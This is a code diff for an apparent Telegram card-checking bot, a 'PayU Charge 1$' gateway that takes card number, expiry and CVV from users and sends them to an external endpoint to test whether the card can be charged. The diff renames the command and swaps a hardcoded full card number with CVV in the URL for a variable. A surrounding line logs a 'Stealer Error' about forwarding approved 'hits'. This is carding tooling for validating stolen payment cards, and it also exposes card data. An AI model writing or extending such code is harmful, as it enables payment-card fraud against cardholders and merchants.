@@ -22,14 +22,14 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("pyu", [".", "/"]))
+@Client.on_message(filters.command("pu", [".", "/"]))
 async def payu_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
 
         gateway = "PayU Charge 1$ 💸"
-        endpoint_url = "https://onyxenvbot.up.railway.app/payu/key=yashikaaa/cc=4100400157539308|08|2026|126"
+        endpoint_url = f"https://onyxenvbot.up.railway.app/payu/key=yashikaaa/cc={fullcc}"
 
         if checkall[0] == False:
             return
@@ -37,7 +37,7 @@ async def payu_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /pyu\n\nMessage: No CC Found in your input ❌\n\nUsage: /payu cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /pu\n\nMessage: No CC Found in your input ❌\n\nUsage: /pu cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
